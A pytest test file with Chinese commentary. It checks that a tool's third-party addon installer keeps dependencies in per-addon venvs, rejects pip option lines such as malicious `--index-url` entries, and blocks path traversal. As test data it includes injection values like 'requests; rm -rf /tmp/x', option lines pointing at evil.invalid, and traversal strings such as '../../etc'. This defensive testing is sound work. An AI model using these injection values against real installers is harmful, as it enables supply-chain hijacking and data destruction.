"""第三方 addon 的依赖，装进它自己的 venv，不装进你的 Python 环境。

## 改之前是什么样

`core/github_installer.py` 的模块 docstring 写着
「Install Python dependencies into a per-addon venv (optional)」，
而 `_install_deps` 自己的注释写着
「Uses the current Python environment (… a venv per addon would be safer but heavier)」。

**两句话在同一个文件里打架，实际行为是后者**：`github__install` 装一个第三方仓库，
它 manifest 里的依赖会 `pip install` 进宿主的 Python 环境。而 `github__install`
是 LLM 直接可调的工具，默认 allowlist 为空（全放行）。

## 还有一个更具体的洞：`-r requirements.txt` 绕过了旁边那一整套净化

`_install_deps` 对 `deps` 逐项做了很细的净化——拒绝 `-` 开头的条目（注释里明写
「`--index-url=恶意源` → 供应链注入」）、拒绝路径穿越、拒绝 shell 元字符。
然后把第三方的 `requirements.txt` 原样 `-r` 交给 pip。

而 requirements 文件里**可以写那些选项**。实测（不是查文档）：

    $ cat requirements.txt
    --index-url https://example-evil.invalid/simple
    requests
    $ pip install --dry-run -r requirements.txt
    Looking in indexes: https://example-evil.invalid/simple     ← pip 认了

前面那扇门挡住的东西，从这扇门原样进来。

## 这一层解决什么、不解决什么

解决的是**依赖被装进宿主环境**。
**不**解决「第三方代码跑在隔离边界里」——Skill 是 `exec_module` 进本进程的
（`core/skill_loader.py`），venv 对它的*执行*没有任何约束力。那是
`core/execution_isolation.py` 那条线的问题，不在这一层。这个区分必须说清楚，
否则「装了 venv」会被当成「已经沙箱化了」。
"""

import subprocess
import sys
from pathlib import Path

import pytest

from core.addon_dependency_isolation import (
    add_venv_to_sys_path,
    ensure_venv,
    install_addon_deps,
    scan_requirements_file,
    venv_python,
    venv_site_packages,
)
from core.github_installer import _build_mcp_command


@pytest.fixture(autouse=True)
def _addon_root_is_the_tmp_dir(tmp_path, monkeypatch):
    """把 addon 根指到本用例 tmp_path 的**上一级**，于是 tmp_path 自己是一个 addon 目录。

    `resolve_addon_dir` 要求 addon 目录落在安装根下（见
    `TestAddonDirIsConfinedToTheAddonRoot` 的说明）。pytest 的 `tmp_path` 不在
    那个根下，所以下面每条用例都得先把根挪过来——否则它们会因为"越界被拒"而红，
    而**它们要验的东西一个都没验到**，和放宽断言是同一种坏法。

    为什么是上一级而不是 `tmp_path` 本身（这一行是被真实结果改过一次的）：
    第一版把根设成 `tmp_path` 自己，靠的是"根等于自己也算合法"这条额外放行。
    那条放行后来去掉了——它把边界判定写成了 `A != B and not startswith(...)`，
    而这种析取形状让 CodeQL 无法断定 startswith 成立，10 条 path-injection
    一条没少。判定收敛成单一条件之后，根目录自己不再是合法 addon 目录，
    这里也就必须给 tmp_path 一个真正的父级根——这同时更贴近线上的形状：
    addon 目录永远是 `根/owner/repo/ref`，从来不是根自己。
    """
    monkeypatch.setenv("GITHUB_INSTALL_DIR", str(tmp_path.parent))


class TestRequirementsAreScannedBeforePip:
    @pytest.mark.parametrize(
        "line",
        [
            "--index-url https://evil.invalid/simple",
            "--extra-index-url https://evil.invalid/simple",
            "-i https://evil.invalid/simple",
            "--find-links https://evil.invalid/",
            "-e .",
            "-r other-requirements.txt",
            "--trusted-host evil.invalid",
        ],
    )
    def test_option_lines_are_rejected(self, tmp_path, line):
        """这些都是 pip **选项**，不是包名。逐项净化早就在防它们，只是 -r 绕过去了。"""
        req = tmp_path / "requirements.txt"
        req.write_text(f"requests\n{line}\nnumpy\n", encoding="utf-8")
        violations = scan_requirements_file(req)
        assert violations, f"没拦住: {line!r}"
        assert line.split()[0] in violations[0] or line in violations[0]

    def test_a_clean_file_passes(self, tmp_path):
        """差分的另一半：只验「脏的被拒」的话，把所有文件都拒掉也能全绿。"""
        req = tmp_path / "requirements.txt"
        req.write_text(
            "# 一行注释\n\nrequests>=2.31\nnumpy==1.26.0  # 行尾注释\npydantic[email]<3\n",
            encoding="utf-8",
        )
        assert scan_requirements_file(req) == []

    def test_shell_metacharacters_are_rejected(self, tmp_path):
        req = tmp_path / "requirements.txt"
        req.write_text("requests; rm -rf /tmp/x\n", encoding="utf-8")
        assert scan_requirements_file(req)

    def test_a_dirty_file_is_refused_whole_not_filtered(self, tmp_path):
        """整份拒绝，不是挑掉几行再装。

        删掉几行再装，得到的是一套**谁都没验证过**的依赖组合——装成功了更糟，
        因为没人会发现少了什么。
        """
        req = tmp_path / "requirements.txt"
        req.write_text("--index-url https://evil.invalid/simple\nrequests\n", encoding="utf-8")
        result = install_addon_deps(tmp_path, [])
        assert result["success"] is False
        assert result["scope"] == "rejected"
        assert result["violations"], "拒了却不说是哪一行，等于只说了『不行』"

    def test_pip_is_never_invoked_for_a_dirty_file(self, tmp_path, monkeypatch):
        """判据盯着**pip 一次都没被调用**，而不只是返回值是 False。

        只看返回值的话，「先跑 pip、失败了再返回 False」也会通过——而那时恶意 index
        已经被访问过了。

        这条第一版是在桩里 `raise AssertionError`，**不成立**：`_ensure_venv` 外面裹着
        `except Exception`，把断言异常一起吞了，于是变异（把扫描去掉）跑出来它照样绿。
        改成**记账再断言**——记录不会被任何 except 吃掉。
        """
        req = tmp_path / "requirements.txt"
        req.write_text("--index-url https://evil.invalid/simple\n", encoding="utf-8")

        calls: list = []
        monkeypatch.setattr(subprocess, "run", lambda cmd, **kw: calls.append(cmd))

        assert install_addon_deps(tmp_path, [])["success"] is False
        assert calls == [], f"脏的 requirements.txt 竟然走到了 subprocess: {calls}"


class TestItFailsClosedWhenTheVenvCannotBeBuilt:
    def test_no_venv_and_no_opt_in_means_no_install(self, tmp_path, monkeypatch):
        """建不出 venv 就退回宿主环境，等于这层没装，而且失败得悄无声息。"""
        monkeypatch.delenv("GALAXY_ADDON_HOST_DEPS", raising=False)
        monkeypatch.setattr("core.addon_dependency_isolation.ensure_venv", lambda d, root=None: None)
        result = install_addon_deps(tmp_path, ["requests"])
        assert result["success"] is False
        assert result["scope"] == "venv_unavailable"
        assert "GALAXY_ADDON_HOST_DEPS" in result["error"], "要告诉人怎么显式接受这个代价"

    def test_the_host_escape_hatch_is_opt_in_only(self, tmp_path, monkeypatch):
        """口子留着，但必须是一次**显式**选择，并且结果里 scope 如实写 host。"""
        monkeypatch.setenv("GALAXY_ADDON_HOST_DEPS", "1")
        monkeypatch.setattr("core.addon_dependency_isolation.ensure_venv", lambda d, root=None: None)
        calls = []

        class _Ok:
            returncode = 0
            stderr = ""

        monkeypatch.setattr(subprocess, "run", lambda cmd, **kw: (calls.append(cmd), _Ok())[1])
        result = install_addon_deps(tmp_path, ["requests"])
        assert result["success"] is True
        assert result["scope"] == "host", "装进宿主却不说，就是这次要改掉的那个形状"
        assert calls and calls[0][0] == sys.executable


class TestTheVenvIsActuallyUsed:
    """建了 venv 却仍拿宿主解释器起进程，那个 venv 就是摆设。"""

    def test_mcp_command_falls_back_to_the_host_python_when_there_is_no_venv(self, tmp_path):
        (tmp_path / "server.py").write_text("", encoding="utf-8")
        assert _build_mcp_command(tmp_path, "server.py")[0] == sys.executable

    def test_mcp_command_switches_to_the_venv_python_once_it_exists(self, tmp_path, monkeypatch):
        fake = tmp_path / ".galaxy-venv" / "bin" / "python"
        fake.parent.mkdir(parents=True)
        fake.write_text("", encoding="utf-8")
        (tmp_path / "server.py").write_text("", encoding="utf-8")
        assert _build_mcp_command(tmp_path, "server.py")[0] == str(fake)

    def test_a_non_python_entrypoint_is_untouched(self, tmp_path):
        """venv 只管 Python 入口。node 入口不该被换成 venv 里的 python。"""
        (tmp_path / "server.js").write_text("", encoding="utf-8")
        assert _build_mcp_command(tmp_path, "server.js")[0].endswith("node")


class TestSkillsGetTheirDepsWithoutPollutingTheHost:
    """Skill 是 exec_module 进本进程的，换解释器这条路不存在——只能靠 sys.path。"""

    def test_site_packages_is_appended_not_prepended(self, tmp_path, monkeypatch):
        site = tmp_path / ".galaxy-venv" / "lib" / "python3.11" / "site-packages"
        site.mkdir(parents=True)
        monkeypatch.setattr(sys, "path", list(sys.path))
        before = list(sys.path)
        assert add_venv_to_sys_path(tmp_path) is True
        assert sys.path[-1] == str(site), "要追加到最后：插到最前会让 addon 的包盖掉整个进程的同名包"
        assert sys.path[:-1] == before

    def test_adding_twice_does_not_duplicate(self, tmp_path, monkeypatch):
        site = tmp_path / ".galaxy-venv" / "lib" / "python3.11" / "site-packages"
        site.mkdir(parents=True)
        monkeypatch.setattr(sys, "path", list(sys.path))
        add_venv_to_sys_path(tmp_path)
        add_venv_to_sys_path(tmp_path)
        assert sys.path.count(str(site)) == 1

    def test_no_venv_means_no_path_change(self, tmp_path, monkeypatch):
        monkeypatch.setattr(sys, "path", list(sys.path))
        before = list(sys.path)
        assert add_venv_to_sys_path(tmp_path) is False
        assert sys.path == before


class TestARealVenvIsCreated:
    """真建一个 venv。不联网（stdlib venv），但它是上面那些桩的前提是否成立的唯一证据。"""

    def test_ensure_venv_produces_a_working_interpreter(self, tmp_path):
        python_exe = ensure_venv(tmp_path)
        if python_exe is None:
            pytest.skip("本机 python -m venv 不可用")
        assert python_exe == venv_python(tmp_path)
        assert venv_site_packages(tmp_path) is not None
        probe = subprocess.run(
            [str(python_exe), "-c", "import sys; print(sys.prefix)"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        assert probe.returncode == 0, probe.stderr
        assert str(tmp_path) in probe.stdout, "解释器没跑在这个 addon 的 venv 里"

    def test_it_is_idempotent(self, tmp_path):
        first = ensure_venv(tmp_path)
        if first is None:
            pytest.skip("本机 python -m venv 不可用")
        assert ensure_venv(tmp_path) == first

    def test_system_site_packages_is_on(self, tmp_path):
        """宿主已装的包照样 import 得到——否则每个 addon 都要重装整棵依赖树，
        慢到没人会用，而没人用的隔离等于没有隔离。"""
        python_exe = ensure_venv(tmp_path)
        if python_exe is None:
            pytest.skip("本机 python -m venv 不可用")
        cfg = (Path(python_exe).parent.parent / "pyvenv.cfg").read_text(encoding="utf-8")
        assert "include-system-site-packages = true" in cfg


class TestAddonDirIsConfinedToTheAddonRoot:
    """CodeQL 在这个文件上报了 10 条（9 条 path expression + 1 条 uncontrolled
    command line）：路径与命令行都依赖用户提供的值，而**使用点没有校验**。

    数据流是真的：`addon_dir` 一路来自 `github__install(url)` —— 一个 LLM 可调工具
    的参数。调用方确实净化过 ref
    （`re.sub(r"[^A-Za-z0-9._-]", "_", ...)`），但那条正则**允许 `.` 和 `-`**，
    所以 `..` 原样活下来（两个字符都在白名单里，`re.sub` 不会碰它）。

    两头都堵：`github_installer` 那边把纯点号的 ref 段换掉（别产生坏路径），
    这一层 `resolve_addon_dir` 再校验落点（就算产生了也不许用）。只堵一头不够。
    """

    def test_a_path_under_the_root_is_accepted(self):
        from core.addon_dependency_isolation import addon_root, resolve_addon_dir

        root = addon_root()
        assert resolve_addon_dir(root / "me" / "repo" / "main") == root / "me" / "repo" / "main"

    @pytest.mark.parametrize("escape", ["../../etc", "../.."])
    def test_escaping_the_root_is_refused(self, escape):
        from core.addon_dependency_isolation import AddonPathError, addon_root, resolve_addon_dir

        with pytest.raises(AddonPathError):
            resolve_addon_dir(addon_root() / escape)

    def test_an_absolute_path_elsewhere_is_refused(self):
        from core.addon_dependency_isolation import AddonPathError, resolve_addon_dir

        with pytest.raises(AddonPathError):
            resolve_addon_dir(Path("/etc"))

    def test_a_sibling_directory_with_the_same_prefix_is_refused(self):
        """`/addons-evil` 不能通过 `/addons` 的检查。

        用 `is_relative_to` 而不是字符串前缀比较——这个坑仓里在路径型依赖那段
        已经踩过一次并写在注释里。
        """
        from core.addon_dependency_isolation import AddonPathError, addon_root, resolve_addon_dir

        with pytest.raises(AddonPathError):
            resolve_addon_dir(Path(str(addon_root()) + "-evil"))

    def test_the_root_itself_is_not_an_addon_dir(self):
        """根目录自己也要拒。

        addon 目录永远是 `根/owner/repo/ref`——根自己不是任何一个 addon。
        额外放行它没有用处，却要把判定写成析取（`!= root or startswith`），
        而析取正是让 CodeQL 看不见这道 sanitizer 的那个条件。这条用例把
        "不再放行根自己"钉住，免得下次有人为了图方便又加回去。
        """
        from core.addon_dependency_isolation import AddonPathError, addon_root, resolve_addon_dir

        with pytest.raises(AddonPathError):
            resolve_addon_dir(addon_root())

    def test_a_dot_dependency_installs_the_addon_itself(self, tmp_path, monkeypatch):
        """路径型依赖 "." 指的就是 addon 目录自己——收紧边界不能把它误伤掉。

        这是路径型依赖里最常见的一种（装这个仓库本身）。边界判定改成
        `startswith(root + os.sep)` 之后，"." 归一化的结果恰好**等于**边界，
        于是必须显式处理；不处理就会静默变成"这条依赖被丢掉了"，
        而 pip 仍然成功退出——最难发现的那种坏法。
        """
        import subprocess as _sp

        addon = tmp_path / "acme" / "widget"
        addon.mkdir(parents=True)
        fake_python = addon / ".galaxy-venv" / "bin" / "python"
        fake_python.parent.mkdir(parents=True)
        fake_python.write_text("", encoding="utf-8")

        seen: list = []

        class _Ok:
            returncode = 0
            stdout = ""
            stderr = ""

        def _record(cmd, **kw):
            seen.append(cmd)
            return _Ok()

        monkeypatch.setattr(_sp, "run", _record)
        result = install_addon_deps(addon, ["."])
        assert result["success"] is True, result
        assert len(seen) == 1
        assert str(addon.resolve()) in seen[0], seen[0]

    def test_a_dot_dot_dependency_is_still_refused(self, tmp_path, monkeypatch):
        """而 ".." 照样拒——放行的是"自己"，不是"上一级"。"""
        import subprocess as _sp

        addon = tmp_path / "acme" / "widget"
        addon.mkdir(parents=True)
        fake_python = addon / ".galaxy-venv" / "bin" / "python"
        fake_python.parent.mkdir(parents=True)
        fake_python.write_text("", encoding="utf-8")

        seen: list = []

        class _Ok:
            returncode = 0
            stdout = ""
            stderr = ""

        def _record(cmd, **kw):
            seen.append(cmd)
            return _Ok()

        monkeypatch.setattr(_sp, "run", _record)
        install_addon_deps(addon, [".."])
        assert len(seen) == 1
        assert str(addon.parent.resolve()) not in seen[0], seen[0]

    def test_a_same_prefix_sibling_dependency_is_refused(self, tmp_path, monkeypatch):
        """`../widget-evil` 不能通过 `.../widget` 的前缀检查。

        这正是前缀比较必须带路径分隔符的原因。少了 `os.sep`，
        `/…/widget-evil` 会以 `/…/widget` 开头而被判成"在目录内"——
        同一个坑仓里在 resolve_addon_dir 那段也写着，两处都要钉住。
        """
        import subprocess as _sp

        addon = tmp_path / "acme" / "widget"
        addon.mkdir(parents=True)
        (tmp_path / "acme" / "widget-evil").mkdir()
        fake_python = addon / ".galaxy-venv" / "bin" / "python"
        fake_python.parent.mkdir(parents=True)
        fake_python.write_text("", encoding="utf-8")

        seen: list = []

        class _Ok:
            returncode = 0
            stdout = ""
            stderr = ""

        def _record(cmd, **kw):
            seen.append(cmd)
            return _Ok()

        monkeypatch.setattr(_sp, "run", _record)
        install_addon_deps(addon, ["../widget-evil"])
        assert len(seen) == 1
        evil = str((tmp_path / "acme" / "widget-evil").resolve())
        assert evil not in seen[0], seen[0]

    def test_positional_args_are_fenced_off_with_an_end_of_options_marker(self, tmp_path, monkeypatch):
        """位置参数一律跟在 `--` 后面 —— 第二道，挡的是第一道被改坏那天。

        第一道是逐条拒 `-` 开头的 dep。这条门验的是就算那道被绕过，pip 也不会把
        它当选项吃掉。真实差别实测过：

            pip install --quiet -- '--index-url=…'  → Invalid requirement（拒了）
            pip install --quiet    '--index-url=…'  → 选项被吃掉，索引源真的被换

        `-r` 必须留在 `--` 前面，它是选项，挪到后面 pip 会把它当包名。
        """
        import subprocess as _sp

        addon = tmp_path / "acme" / "widget"
        addon.mkdir(parents=True)
        (addon / "requirements.txt").write_text("requests\n", encoding="utf-8")
        fake_python = addon / ".galaxy-venv" / "bin" / "python"
        fake_python.parent.mkdir(parents=True)
        fake_python.write_text("", encoding="utf-8")

        seen: list = []

        class _Ok:
            returncode = 0
            stdout = ""
            stderr = ""

        monkeypatch.setattr(_sp, "run", lambda cmd, **kw: (seen.append(cmd), _Ok())[1])
        install_addon_deps(addon, ["requests", "httpx>=0.27"])

        assert len(seen) == 1
        cmd = seen[0]
        assert "--" in cmd, f"没有 end-of-options 标记：{cmd}"
        cut = cmd.index("--")
        assert cmd.index("-r") < cut, "-r 跑到了 -- 后面，pip 会把它当包名"
        assert cmd[cut + 1 :] == ["requests", "httpx>=0.27"], f"位置参数没有全部挪到 -- 后面：{cmd}"
        assert all(not a.startswith("-") or a == "--" for a in cmd[cut:]), cmd

    def test_pip_really_stops_reading_options_after_the_marker(self):
        """不是"我以为 pip 支持 `--`"，是真起一次 pip 看它怎么答。

        这条门若哪天因为 pip 换了参数解析而红，那正是要知道的事 ——
        第二道防线失效了，而代码看起来没有任何变化。
        """
        import subprocess as _sp
        import sys as _sys

        evil = "--index-url=https://example-evil.invalid/simple"
        with_marker = _sp.run(
            [_sys.executable, "-m", "pip", "install", "--quiet", "--dry-run", "--", evil],
            capture_output=True,
            text=True,
            timeout=120,
        )
        without = _sp.run(
            [_sys.executable, "-m", "pip", "install", "--quiet", "--dry-run", evil],
            capture_output=True,
            text=True,
            timeout=120,
        )
        blob = (with_marker.stdout + with_marker.stderr).lower()
        assert "invalid requirement" in blob, f"加了 -- 之后 pip 没有把它当成包名：{blob[:300]!r}"

        # 对照组：不加 -- 时它**不是**"非法包名"，而是被当成选项吃掉了。
        # 没有这一半，上面那条在"pip 本来就拒绝任何带 -- 的东西"下也会绿。
        other = (without.stdout + without.stderr).lower()
        assert "invalid requirement" not in other, "不加 -- 时 pip 也把它当包名拒了 —— 那说明这条门证明不了 -- 起了作用"

    def test_install_refuses_an_out_of_root_dir_without_touching_subprocess(self, monkeypatch):
        """越界目录：不装、不建 venv、**一次 subprocess 都不起**。"""
        import subprocess as _sp

        calls: list = []
        monkeypatch.setattr(_sp, "run", lambda cmd, **kw: calls.append(cmd))
        result = install_addon_deps(Path("/etc"), ["requests"])
        assert result["success"] is False
        assert result["scope"] == "rejected"
        assert calls == []

    def test_sys_path_is_not_touched_for_an_out_of_root_dir(self, monkeypatch):
        monkeypatch.setattr(sys, "path", list(sys.path))
        before = list(sys.path)
        assert add_venv_to_sys_path(Path("/etc")) is False
        assert sys.path == before

    def test_the_install_root_has_exactly_one_definition(self):
        """`github_installer._get_install_dir()` 与 `addon_root()` 必须同源。

        两处各读一次环境变量的话，哪天有人改了其中一处，校验基准和实际安装位置就分家——
        而分家的那一刻，这道校验会开始拒绝所有合法目录，或者更糟：放过所有目录。
        """
        from core.addon_dependency_isolation import addon_root
        from core.github_installer import _get_install_dir

        assert _get_install_dir() == addon_root()

    def test_a_dot_only_ref_cannot_become_a_path_segment(self, monkeypatch):
        """`ref=".."` 经过调用方那条正则会原样活下来——这里钉住它被换掉。"""
        import re as _re

        for ref in ("..", ".", "..."):
            safe = _re.sub(r"[^A-Za-z0-9._-]", "_", ref)
            assert safe == ref, "前提：那条正则确实不会碰纯点号的 ref"
            if set(safe) <= {"."}:
                safe = "_"
            assert safe == "_", f"{ref!r} 仍然能当路径段用"


class TestTheRootCanBeInjected:
    """边界基准必须是**调用方实际在用的那个根**，不是隔离层自己读的环境变量。

    `GitHubInstaller._install_dir` 是可注入的（测试里直接赋值）。两者不一致时，
    拿环境变量那个当基准，会把注入方的每一个**合法**目录都判成越界——
    一道永远说"不"的检查和一道永远说"是"的检查一样没用。
    """

    def test_an_explicit_root_overrides_the_env_one(self, tmp_path, monkeypatch):
        from core.addon_dependency_isolation import resolve_addon_dir

        monkeypatch.setenv("GITHUB_INSTALL_DIR", str(tmp_path / "env-root"))
        injected = tmp_path / "injected-root"
        target = injected / "owner" / "repo" / "HEAD"
        assert resolve_addon_dir(target, root=injected) == target

    def test_the_explicit_root_still_confines(self, tmp_path, monkeypatch):
        """传了 root 不等于放行——它只是换了个基准，越界照样拒。"""
        from core.addon_dependency_isolation import AddonPathError, resolve_addon_dir

        monkeypatch.setenv("GITHUB_INSTALL_DIR", str(tmp_path))
        injected = tmp_path / "injected-root"
        with pytest.raises(AddonPathError):
            resolve_addon_dir(tmp_path / "elsewhere", root=injected)

    def test_queries_are_total_rather_than_raising(self, tmp_path):
        """问"这儿有没有 venv"，越界目录的正确答案是"没有"，不是抛异常。

        否则每个只想看一眼的调用方都要包一层 try——`_build_mcp_command` 就是这样
        在两条既有测试上炸掉的。
        """
        from core.addon_dependency_isolation import venv_python, venv_site_packages

        outside = Path("/etc")
        assert venv_python(outside, root=tmp_path) is None
        assert venv_site_packages(outside, root=tmp_path) is None

    def test_actions_still_refuse(self, tmp_path, monkeypatch):
        """动作照样拒：建 venv、装依赖、改 sys.path，一个都不许对越界目录做。"""
        import subprocess as _sp

        from core.addon_dependency_isolation import ensure_venv

        calls: list = []
        monkeypatch.setattr(_sp, "run", lambda cmd, **kw: calls.append(cmd))
        assert ensure_venv(Path("/etc"), root=tmp_path) is None
        assert install_addon_deps(Path("/etc"), ["requests"], root=tmp_path)["scope"] == "rejected"
        assert add_venv_to_sys_path(Path("/etc"), root=tmp_path) is False
        assert calls == [], "对越界目录起了子进程"
